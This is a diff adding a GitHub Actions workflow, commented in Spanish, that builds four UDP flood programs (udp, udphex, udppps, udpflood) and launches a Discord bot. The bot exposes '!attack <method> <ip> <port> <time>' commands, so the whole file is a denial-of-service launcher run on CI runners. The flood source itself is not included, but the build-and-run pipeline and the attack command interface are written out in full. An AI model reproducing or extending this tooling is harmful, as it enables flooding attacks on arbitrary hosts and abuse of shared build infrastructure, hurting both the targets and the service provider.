@@ -1,0 +1,113 @@
+name: UDPBot Power best
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+jobs:
+  build-and-run:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
+
+      - name: Set up Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
+      - name: Install Python dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install -U discord.py || true
+
+      - name: Ensure build tools are available
+        run: sudo apt-get update && sudo apt-get install -y build-essential
+
+      - name: Build UDP binaries
+        run: |
+          # Compilar udp (antiguo udphexv1)
+          if [ -f udp.c ]; then
+            gcc -O3 -pthread -o udp udp.c || true
+            echo "✓ Compilado: udp (de udp.c)"
+            chmod +x udp
+          else
+            echo "✗ udp.c no encontrado, omitiendo compilación de udp"
+          fi
+
+          # Compilar udphex (antiguo udphexv2)
+          if [ -f udphex.c ]; then
+            gcc -O3 udphex.c -o udphex || true
+            echo "✓ Compilado: udphex (de udphex.c)"
+            chmod +x udphex
+          else
+            echo "✗ udphex.c no encontrado, omitiendo compilación de udphex"
+          fi
+
+          # Compilar nuevo método udppps
+          if [ -f udppps.c ]; then
+            gcc -O3 udppps.c -o udppps || true
+            echo "✓ Compilado: udppps (nuevo método)"
+            chmod +x udppps
+          else
+            echo "✗ udppps.c no encontrado, omitiendo compilación de udppps"
+          fi
+
+          # Verificar udpflood.go
+          if [ -f udpflood.go ]; then
+            echo "✓ Encontrado: udpflood.go (método Go)"
+            go build -o udpflood udpflood.go 2>/dev/null || echo "⚠ No se pudo compilar udpflood.go, pero funcionará con 'go run'"
+          else
+            echo "✗ udpflood.go no encontrado"
+          fi
+
+          # Listar archivos compilados
+          echo ""
+          echo "=== Archivos disponibles ==="
+          for bin in udp udphex udppps udpflood; do
+            if [ -f "$bin" ]; then
+              echo "✓ $bin (ejecutable)"
+            else
+              if [ -f "$bin.c" ] || [ -f "$bin.go" ]; then
+                echo "✓ $bin (archivo fuente presente)"
+              else
+                echo "✗ $bin (no encontrado)"
+              fi
+            fi
+          done
+          echo "====================================="
+
+      - name: Run bot with all methods
+        env:
+          KEYS: ${{ secrets.KEYS }}
+        run: |
+          echo "====================================="
+          echo "Iniciando UDPHexBot con todos los métodos"
+          echo "Comandos disponibles:"
+          echo "  !attack udp <ip> <puerto> <tiempo>"
+          echo "  !attack udphex <ip> <puerto> <tiempo>"
+          echo "  !attack udppps <ip> <puerto> <tiempo>"
+          echo "  !attack udpflood <ip> <puerto> <tiempo>"
+          echo "  !methods - Muestra información de métodos"
+          echo "====================================="
+          
+          # Probar que Go funciona
+          echo "Probando Go..."
+          go version
+          
+          # Probar que podemos ejecutar el script Go
+          if [ -f udpflood.go ]; then
+            echo "Probando compilación de udpflood.go..."
+            go run udpflood.go 2>&1 | head -5 || echo "Error al probar udpflood.go"
+          fi
+          
+          echo ""
+          echo "Iniciando bot..."
+          python bot.py
